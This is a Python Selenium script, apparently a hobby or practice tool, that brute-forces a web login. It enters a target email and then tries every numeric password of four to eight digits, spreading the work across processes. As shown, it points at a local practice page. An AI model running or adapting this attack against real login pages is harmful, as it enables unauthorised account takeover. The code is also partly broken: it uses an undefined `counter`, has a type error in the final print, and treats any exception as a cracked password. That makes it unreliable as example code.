from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time
import multiprocessing


userEmail = input("What's the email: ")
password = ''
passwordLength = int(input("How long is the password: "))

# Generate a number from 4 to 8 characters with the individual counters from the loops


def toNumber(num1, num2, num3, num4, num5=0, num6=0, num7=0, num8=0):
    if(passwordLength == 4):
        password = str(num1) + str(num2) + str(num3) + str(num4)
        return password
    if passwordLength == 5:
        password = str(num1) + str(num2) + str(num3) + str(num4) + str(num5)
        return password
    if(passwordLength == 6):
        password = str(num1) + str(num2) + str(num3) + \
            str(num4) + str(num5) + str(num6)
        return password
    if passwordLength == 7:
        password = str(num1) + str(num2) + str(num3) + \
            str(num4) + str(num5) + str(num6) + str(num7)
        return password
    if(passwordLength == 8):
        password = str(num1) + str(num2) + str(num3) + str(num4) + \
            str(num5) + str(num6) + str(num7) + str(num8)
        return password

# Opens up the browser on the target's page, inputs the email and start combining the numbers and testing them


def Crack(startWith):
    wb = webdriver.Chrome('./chromedriver')
    wb.get("http://localhost:5500/PasswordCracker/")
    inputEmail = wb.find_element_by_id('email')
    inputPassword = wb.find_element_by_id('password')
    submitbtn = wb.find_element_by_class_name('login-btn')
    inputEmail.send_keys(userEmail)
    for num1 in range(startWith, 10):
        for num2 in range(0, 10):
            for num3 in range(0, 10):
                for num4 in range(0, 10):
                    if (passwordLength == 4):
                        try:
                            password = toNumber(
                                num1, num2, num3, num4)
                            inputPassword.send_keys(password)
                            submitbtn.click()
                            inputPassword.send_keys(
                                Keys.CONTROL + "a")
                            inputPassword.send_keys(
                                Keys.BACKSPACE)
                            print(
                                "[ ! ]Trying this password:" + password)
                        except:
                            print(
                                "[ + ] The password has been cracked")
                            print(
                                "[ + ] User Password: " + password)
                            return True
                    for num5 in range(0, 10):
                        if (passwordLength == 5):
                            try:
                                password = toNumber(
                                    num1, num2, num3, num4, num5)
                                inputPassword.send_keys(password)
                                submitbtn.click()
                                inputPassword.send_keys(
                                    Keys.CONTROL + "a")
                                inputPassword.send_keys(
                                    Keys.BACKSPACE)
                                print(
                                    "[ ! ]Trying this password:" + password)
                            except:
                                print(
                                    "[ + ] The password has been cracked")
                                print(
                                    "[ + ] User Password: " + password)
                                return True
                        for num6 in range(0, 10):
                            if (passwordLength) == 6:
                                try:
                                    password = toNumber(
                                        num1, num2, num3, num4, num5, num6)
                                    inputPassword.send_keys(password)
                                    submitbtn.click()
                                    inputPassword.send_keys(
                                        Keys.CONTROL + "a")
                                    inputPassword.send_keys(
                                        Keys.BACKSPACE)
                                    print(
                                        "[ ! ]Trying this password:" + password)
                                except:
                                    print(
                                        "[ + ] The password has been cracked")
                                    print(
                                        "[ + ] User Password: " + password)
                                    return True
                            for num7 in range(0, 10):
                                if passwordLength == 7:
                                    try:
                                        password = toNumber(
                                            num1, num2, num3, num4, num5, num6, num7)
                                        inputPassword.send_keys(password)
                                        submitbtn.click()
                                        inputPassword.send_keys(
                                            Keys.CONTROL + "a")
                                        inputPassword.send_keys(
                                            Keys.BACKSPACE)
                                        print(
                                            "[ ! ]Trying this password:" + password)
                                    except:
                                        print(
                                            "[ + ] The password has been cracked")
                                        print(
                                            "[ + ] User Password: " + password)
                                        return True
                                for num8 in range(0, 10):
                                    if (passwordLength) == 8:
                                        try:
                                            password = toNumber(
                                                num1, num2, num3, num4, num5, num6, num7, num8)
                                            inputPassword.send_keys(password)
                                            submitbtn.click()
                                            inputPassword.send_keys(
                                                Keys.CONTROL + "a")
                                            inputPassword.send_keys(
                                                Keys.BACKSPACE)
                                            print(
                                                "[ ! ]Trying this password:" + password)
                                        except:
                                            print(
                                                "[ + ] The password has been cracked")
                                            print(
                                                "[ + ] User Password: " + password)
                                            return True


# Start process time counter

start = time.time()

# Starts all processes (Based in the # of cores)

pool = multiprocessing.Pool()

# Breaks the execution when one of the processes cracks the password

for result in pool.imap_unordered(Crack, range(0, 10)):
    if result:
        break

# Store the time the execution ended and print the elapsed time

end = time.time()
print("Número de tentativas: " + counter * 8)
print("[ + ] Time elapsed: %.2fs" % (end - start))
